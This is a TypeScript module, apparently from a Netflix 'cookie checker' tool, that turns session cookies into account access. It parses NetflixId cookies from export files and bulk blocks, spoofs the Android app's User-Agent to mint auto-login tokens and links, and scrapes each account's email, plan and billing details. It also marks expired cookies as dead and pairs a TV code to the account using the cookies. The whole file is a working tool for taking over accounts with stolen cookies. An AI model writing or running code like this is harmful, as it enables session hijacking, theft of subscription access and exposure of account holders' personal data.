import axios from 'axios'

// ── Types ────────────────────────────────────────────────────────────────────
interface CookieDict { [key: string]: string }

export interface NFTokenResult {
  success: boolean
  token?: string
  link?: string
  error?: string
}

export interface NetflixMetadata {
  success: boolean
  country?: string
  countryName?: string
  plan?: string
  planPrice?: string
  videoQuality?: string
  maxStreams?: string
  nextBillingDate?: string
  memberSince?: string
  email?: string
  error?: string
}

export interface CheckResult {
  success: boolean
  token?: string
  link?: string
  metadata?: NetflixMetadata
  error?: string
}

export interface TVActivateResult {
  success: boolean
  dead?: boolean
  error?: string
}

// ── Countries ────────────────────────────────────────────────────────────────
export const COUNTRIES: { [code: string]: { name: string; flag: string } } = {
  'US': { name: 'Estados Unidos', flag: '🇺🇸' },
  'MX': { name: 'México', flag: '🇲🇽' },
  'PE': { name: 'Perú', flag: '🇵🇪' },
  'CO': { name: 'Colombia', flag: '🇨🇴' },
  'AR': { name: 'Argentina', flag: '🇦🇷' },
  'CL': { name: 'Chile', flag: '🇨🇱' },
  'BR': { name: 'Brasil', flag: '🇧🇷' },
  'ES': { name: 'España', flag: '🇪🇸' },
  'CA': { name: 'Canadá', flag: '🇨🇦' },
  'DE': { name: 'Alemania', flag: '🇩🇪' },
  'FR': { name: 'Francia', flag: '🇫🇷' },
  'GB': { name: 'Reino Unido', flag: '🇬🇧' },
  'JP': { name: 'Japón', flag: '🇯🇵' },
  'IT': { name: 'Italia', flag: '🇮🇹' },
  'AU': { name: 'Australia', flag: '🇦🇺' },
  'NL': { name: 'Países Bajos', flag: '🇳🇱' },
  'SE': { name: 'Suecia', flag: '🇸🇪' },
  'NO': { name: 'Noruega', flag: '🇳🇴' },
  'DK': { name: 'Dinamarca', flag: '🇩🇰' },
  'FI': { name: 'Finlandia', flag: '🇫🇮' },
  'BE': { name: 'Bélgica', flag: '🇧🇪' },
  'AT': { name: 'Austria', flag: '🇦🇹' },
  'CH': { name: 'Suiza', flag: '🇨🇭' },
  'PT': { name: 'Portugal', flag: '🇵🇹' },
  'PL': { name: 'Polonia', flag: '🇵🇱' },
  'CZ': { name: 'República Checa', flag: '🇨🇿' },
  'HU': { name: 'Hungría', flag: '🇭🇺' },
  'RO': { name: 'Rumania', flag: '🇷🇴' },
  'BG': { name: 'Bulgaria', flag: '🇧🇬' },
  'HR': { name: 'Croacia', flag: '🇭🇷' },
  'SK': { name: 'Eslovaquia', flag: '🇸🇰' },
  'SI': { name: 'Eslovenia', flag: '🇸🇮' },
  'EE': { name: 'Estonia', flag: '🇪🇪' },
  'LV': { name: 'Letonia', flag: '🇱🇻' },
  'LT': { name: 'Lituania', flag: '🇱🇹' },
  'GR': { name: 'Grecia', flag: '🇬🇷' },
  'TR': { name: 'Turquía', flag: '🇹🇷' },
  'IL': { name: 'Israel', flag: '🇮🇱' },
  'ZA': { name: 'Sudáfrica', flag: '🇿🇦' },
  'NG': { name: 'Nigeria', flag: '🇳🇬' },
  'EG': { name: 'Egipto', flag: '🇪🇬' },
  'KR': { name: 'Corea del Sur', flag: '🇰🇷' },
  'TW': { name: 'Taiwán', flag: '🇹🇼' },
  'HK': { name: 'Hong Kong', flag: '🇭🇰' },
  'SG': { name: 'Singapur', flag: '🇸🇬' },
  'TH': { name: 'Tailandia', flag: '🇹🇭' },
  'PH': { name: 'Filipinas', flag: '🇵🇭' },
  'MY': { name: 'Malasia', flag: '🇲🇾' },
  'ID': { name: 'Indonesia', flag: '🇮🇩' },
  'IN': { name: 'India', flag: '🇮🇳' },
  'EC': { name: 'Ecuador', flag: '🇪🇨' },
  'VE': { name: 'Venezuela', flag: '🇻🇪' },
  'UY': { name: 'Uruguay', flag: '🇺🇾' },
  'PY': { name: 'Paraguay', flag: '🇵🇾' },
  'BO': { name: 'Bolivia', flag: '🇧🇴' },
  'DO': { name: 'República Dominicana', flag: '🇩🇴' },
  'PA': { name: 'Panamá', flag: '🇵🇦' },
  'CR': { name: 'Costa Rica', flag: '🇨🇷' },
  'GT': { name: 'Guatemala', flag: '🇬🇹' },
  'SV': { name: 'El Salvador', flag: '🇸🇻' },
  'HN': { name: 'Honduras', flag: '🇭🇳' },
  'NI': { name: 'Nicaragua', flag: '🇳🇮' },
  'CU': { name: 'Cuba', flag: '🇨🇺' },
  'NZ': { name: 'Nueva Zelanda', flag: '🇳🇿' },
  'AE': { name: 'Emiratos Árabes', flag: '🇦🇪' },
  'SA': { name: 'Arabia Saudita', flag: '🇸🇦' },
}

// ── Cookie Extraction ────────────────────────────────────────────────────────
export function extractCookiesFromText(text: string): CookieDict | null {
  // JSON format (Cookie Editor export)
  try {
    const data = JSON.parse(text)
    if (Array.isArray(data)) {
      const cd: CookieDict = {}
      for (const item of data) {
        if (item?.name && item?.value &&
          ['NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent'].includes(item.name))
          cd[item.name] = item.value
      }
      if (cd.NetflixId) return cd
    }
  } catch {}

  // Netscape format
  if (text.includes('\t') && (text.includes('NetflixId') || text.includes('nfvdid'))) {
    const cd: CookieDict = {}
    for (const line of text.split('\n')) {
      if (!line.trim() || line.startsWith('#')) continue
      const parts = line.trim().split('\t')
      if (parts.length >= 7) cd[parts[5]] = parts[6]
    }
    if (cd.NetflixId) return cd
  }

  // Raw string format
  const cd: CookieDict = {}
  for (const [name, regex] of Object.entries({
    nfvdid: /nfvdid=([^;]+)/,
    NetflixId: /NetflixId=([^;]+)/,
    SecureNetflixId: /SecureNetflixId=([^;]+)/,
    OptanonConsent: /OptanonConsent=([^;]+)/,
  })) {
    const m = text.match(regex as RegExp)
    if (m) cd[name] = m[1]
  }
  if (cd.NetflixId) return cd

  return null
}

export function extractCookiesFromBlock(text: string): CookieDict[] {
  const results: CookieDict[] = []
  if (!text || !text.trim()) return results

  const blocks = text.split(/\n\s*\n/)
  for (const block of blocks) {
    const trimmed = block.trim()
    if (!trimmed || trimmed.startsWith('#')) continue
    const dict = extractCookiesFromText(trimmed)
    if (dict) {
      results.push(dict)
      continue
    }
    const lines = trimmed.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'))
    for (const line of lines) {
      const lineDict = extractCookiesFromText(line)
      if (lineDict) results.push(lineDict)
    }
  }
  return results
}

// ── Cookie String Builder ────────────────────────────────────────────────────
export function buildCookieString(cd: CookieDict, onlyAndroid = false): string {
  const keys = onlyAndroid ? ['NetflixId', 'SecureNetflixId', 'nfvdid'] : Object.keys(cd)
  return keys.filter(k => cd[k]).map(k => `${k}=${cd[k]}`).join('; ')
}

// ── NFToken Generation ───────────────────────────────────────────────────────
export async function generateToken(cd: CookieDict): Promise<NFTokenResult> {
  const missing = ['NetflixId', 'SecureNetflixId', 'nfvdid'].filter(k => !cd[k])
  if (missing.length) return { success: false, error: `Faltan cookies: ${missing.join(', ')}` }

  try {
    const { data } = await axios.post(
      'https://android13.prod.ftl.netflix.com/graphql',
      {
        operationName: 'CreateAutoLoginToken',
        variables: { scope: 'WEBVIEW_MOBILE_STREAMING' },
        extensions: {
          persistedQuery: {
            version: 102,
            id: '76e97129-f4b5-41a0-a73c-12e674896849',
          },
        },
      },
      {
        headers: {
          'User-Agent':
            'com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)',
          'Content-Type': 'application/json',
          Cookie: buildCookieString(cd, true),
        },
        timeout: 30000,
      }
    )

    const token = data?.data?.createAutoLoginToken
    if (token) {
      return { success: true, token, link: `https://netflix.com/?nftoken=${token}` }
    }
    return { success: false, error: 'Sin token en respuesta' }
  } catch (e: any) {
    return { success: false, error: e.response?.data?.message || e.message || 'Error de red' }
  }
}

// ── Netflix Metadata ─────────────────────────────────────────────────────────
export async function getMetadata(cd: CookieDict): Promise<NetflixMetadata> {
  try {
    const res = await axios.get('https://www.netflix.com/account/membership', {
      headers: {
        'User-Agent':
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        Cookie: buildCookieString(cd),
      },
      maxRedirects: 0,
      validateStatus: (s: number) => s < 400,
      timeout: 20000,
    })

    if (res.status >= 300) return { success: false, error: 'Cookie inválida (redirect)' }

    const html: string = res.data
    const match = html.match(/netflix\.reactContext\s*=\s*(\{.+?\})(?=;\s*<\/script>)/s)
    if (!match) return { success: false, error: 'No se pudo extraer metadata' }

    const rc = JSON.parse(
      match[1].replace(
        /\\x([0-9a-fA-F]{2})/g,
        (_: string, h: string) => String.fromCharCode(parseInt(h, 16))
      )
    )

    const models = rc?.models || {}
    const sc = models?.signupContext?.data || {}
    const fields = sc?.flow?.fields || {}
    const plan = fields?.currentPlan?.fields || {}
    const dig = (obj: any, ...keys: string[]): any =>
      keys.reduce((o, k) => (o && typeof o === 'object' ? o[k] : undefined), obj)

    return {
      success: true,
      country: dig(sc, 'userInfo', 'countryOfSignup'),
      plan: plan?.localizedPlanName?.value,
      planPrice: plan?.planPrice?.value,
      videoQuality: plan?.videoQuality?.value,
      maxStreams: plan?.maxStreams?.value,
      nextBillingDate: plan?.nextBillingDate?.value || fields?.nextBillingDate?.value,
      memberSince: plan?.memberSince?.value
        ? new Date(plan.memberSince.value).toISOString().split('T')[0]
        : undefined,
      email: models?.accountInfo?.data?.emailAddress,
    }
  } catch (e: any) {
    return { success: false, error: e.message }
  }
}

// ── Full Check (Token + Metadata) ────────────────────────────────────────────
export async function fullCheck(cookieText: string): Promise<CheckResult> {
  const cd = extractCookiesFromText(cookieText)
  if (!cd) return { success: false, error: 'No se pudieron extraer cookies válidas' }

  const tokenResult = await generateToken(cd)
  if (!tokenResult.success) return { success: false, error: tokenResult.error }

  const metadata = await getMetadata(cd)

  return {
    success: true,
    token: tokenResult.token,
    link: tokenResult.link,
    metadata,
  }
}

// ── Country Detection from NetflixId ─────────────────────────────────────────
export function extractCountryFromNetflixId(netflixIdValue: string): string | null {
  try {
    const parts = netflixIdValue.split('|')
    if (parts.length < 3) return null

    const base64Part = parts[2]
    if (!base64Part) return null

    // Add padding if needed
    const padded = base64Part + '='.repeat((4 - base64Part.length % 4) % 4)
    const decoded = Buffer.from(padded, 'base64').toString('utf-8')
    const json = JSON.parse(decoded)

    const dig = (obj: any, ...keys: string[]): any =>
      keys.reduce((o, k) => (o && typeof o === 'object' ? o[k] : undefined), obj)

    return (
      dig(json, 'customerInfo', 'country') ||
      dig(json, 'user', 'country') ||
      dig(json, 'geo', 'country') ||
      dig(json, 'authInfo', 'country') ||
      null
    )
  } catch {
    return null
  }
}

// ── TV Activation ────────────────────────────────────────────────────────────
const TV_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'

function extractAuthURL(html: string): string {
  // Try multiple patterns Netflix uses
  const patterns = [
    /name="authURL"\s+value="([^"]+)"/,
    /"authURL"\s*:\s*"([^"]+)"/,
    /authURL=([^&"\s]+)/,
    /"authURL":"([^"]+)"/,
    /id="authURL"[^>]*value="([^"]+)"/,
  ]
  for (const p of patterns) {
    const m = html.match(p)
    if (m?.[1]) return m[1]
  }
  // Try reactContext
  const rcMatch = html.match(/netflix\.reactContext\s*=\s*(\{.+?\})(?=;\s*<\/script>)/s)
  if (rcMatch) {
    try {
      const rc = JSON.parse(rcMatch[1].replace(/\\x([0-9a-fA-F]{2})/g, (_: string, h: string) => String.fromCharCode(parseInt(h, 16))))
      const dig = (o: any, ...ks: string[]): any => ks.reduce((a, k) => (a && typeof a === 'object' ? a[k] : undefined), o)
      const auth = dig(rc, 'models', 'serverDefs', 'data', 'authURL') || dig(rc, 'models', 'userInfo', 'data', 'authURL') || dig(rc, 'models', 'flow', 'data', 'authURL')
      if (auth) return String(auth)
    } catch {}
  }
  return ''
}

export async function activateTV(cd: CookieDict, code: string): Promise<TVActivateResult> {
  if (!cd.NetflixId || !cd.SecureNetflixId) {
    return { success: false, error: 'Faltan cookies requeridas (NetflixId, SecureNetflixId)' }
  }

  if (!/^\d{8}$/.test(code)) {
    return { success: false, error: 'El código debe tener 8 dígitos' }
  }

  const cookieStr = buildCookieString(cd)

  // Try up to 3 times with different approaches
  for (let attempt = 1; attempt <= 3; attempt++) {
    try {
      // Step 1: GET /tv8 to verify membership and extract authURL
      const getRes = await axios.get('https://www.netflix.com/tv8', {
        headers: {
          'User-Agent': TV_UA,
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.5',
          Cookie: cookieStr,
        },
        maxRedirects: 0,
        validateStatus: () => true,
        timeout: 25000,
      })

      // Redirect to login = dead cookie
      if (getRes.status >= 300 && getRes.status < 400) {
        const loc = getRes.headers.location || ''
        if (loc.includes('/login')) {
          return { success: false, dead: true, error: 'Cookie expirada (redirige a login)' }
        }
        // Follow redirect for other 3xx
        return { success: false, dead: true, error: 'Cookie inválida (redirección)' }
      }

      const html: string = getRes.data

      // Check membership status
      if (html.includes('"membershipStatus"') && !html.includes('"CURRENT_MEMBER"')) {
        return { success: false, dead: true, error: 'No es miembro activo' }
      }

      // If already on a page that mentions code entry, proceed
      const authURL = extractAuthURL(html)
      if (!authURL) {
        if (attempt < 3) {
          // Try a fresh request
          await new Promise(r => setTimeout(r, 1000))
          continue
        }
        return { success: false, error: 'No se pudo obtener authURL de Netflix' }
      }

      // Step 2: POST /tv8 with the TV code
      const postRes = await axios.post(
        'https://www.netflix.com/tv8',
        new URLSearchParams({
          authURL,
          flow: 'websiteSignUp',
          flowMode: 'enterTvLoginRendezvousCode',
          tvLoginRendezvousCode: code,
          action: 'nextAction',
        }).toString(),
        {
          headers: {
            'User-Agent': TV_UA,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.netflix.com',
            'Referer': 'https://www.netflix.com/tv8',
            Cookie: cookieStr,
          },
          maxRedirects: 0,
          validateStatus: () => true,
          timeout: 25000,
        }
      )

      // Check for success redirect
      if (postRes.status >= 300 && postRes.status < 400) {
        const location = postRes.headers.location || ''
        if (location.includes('/tv/out/success') || location.includes('success')) {
          return { success: true }
        }
        if (location.includes('/login')) {
          return { success: false, dead: true, error: 'Sesión expirada durante activación' }
        }
        // Some redirects after POST are success too
        if (location.includes('/tv') || location.includes('/browse')) {
          return { success: true }
        }
      }

      // Check HTML response for success indicators
      const postHtml: string = postRes.data
      if (typeof postHtml === 'string') {
        if (postHtml.includes('tv/out/success') || postHtml.includes('activateSuccess') || postHtml.includes('TVActivationSuccess')) {
          return { success: true }
        }
        // Check for error patterns
        if (postHtml.includes('invalidCode') || postHtml.includes('codeInvalid')) {
          return { success: false, error: 'Código inválido o expirado' }
        }
        if (postHtml.includes('tooManyAttempts') || postHtml.includes('rateLimit')) {
          return { success: false, error: 'Demasiados intentos, espera un momento' }
        }
        // Extract error message from Netflix
        const errorMatch = postHtml.match(/class="message"[^>]*>([^<]+)/) ||
                           postHtml.match(/"errorMessage":"([^"]+)"/) ||
                           postHtml.match(/"message":"([^"]+)"/)
        if (errorMatch) {
          return { success: false, error: errorMatch[1].trim() }
        }
      }

      // If we got a 200 with no success indicators, might need to try the API approach
      if (attempt < 3) {
        await new Promise(r => setTimeout(r, 1500))
        continue
      }

      return { success: false, error: 'No se pudo completar la activación de TV' }
    } catch (e: any) {
      if (attempt < 3) {
        await new Promise(r => setTimeout(r, 2000))
        continue
      }
      return { success: false, error: e.message || 'Error de red' }
    }
  }

  return { success: false, error: 'Falló después de múltiples intentos' }
}

// ── Helpers ──────────────────────────────────────────────────────────────────
export function getPlanType(planName: string): string {
  if (!planName) return 'Unknown'
  const p = planName.toLowerCase()
  if (p.includes('premium')) return 'Premium'
  if (p.includes('standard')) return 'Standard'
  if (p.includes('basic')) return 'Basic'
  if (p.includes('essential')) return 'Essential'
  if (p.includes('mobile')) return 'Mobile'
  return planName
}

export function getProgressBar(current: number, total: number, length = 10): string {
  const percent = total > 0 ? current / total : 0
  const filled = Math.floor(length * percent)
  return `[${'▓'.repeat(filled)}${'░'.repeat(length - filled)}] ${Math.floor(percent * 100)}%`
}
